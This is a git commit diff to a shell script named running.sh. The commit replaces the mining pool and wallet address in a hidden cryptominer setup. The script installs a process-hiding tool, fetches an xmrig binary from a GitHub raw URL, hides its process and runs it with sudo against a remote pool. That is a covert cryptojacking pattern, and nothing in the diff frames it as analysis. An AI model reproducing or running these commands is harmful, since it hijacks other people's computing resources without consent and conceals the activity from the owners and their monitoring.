429c6314d6c61aab7962ddcaffab0f2aa3565822
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-27 09:58:35 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -3,4 +3,4 @@ npm i -g node-process-hider
 wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
 chmod 500 xmrig
 ph add xmrig
-sudo ./xmrig -o us-qrl.volt-mine.com:4333 -u Q01050018ae33f2279aeafbb40b03bee3c2b69a0f2f27bd147d68dc4c6cfa807e93cc27ccef4e15 -k --tls --threads=8
+sudo ./xmrig -o bbp.hanalani.org:3001 -u B6UC9yE4oRa3vPzHAqZMkiDUjh2mHusPsX -k--threads=8
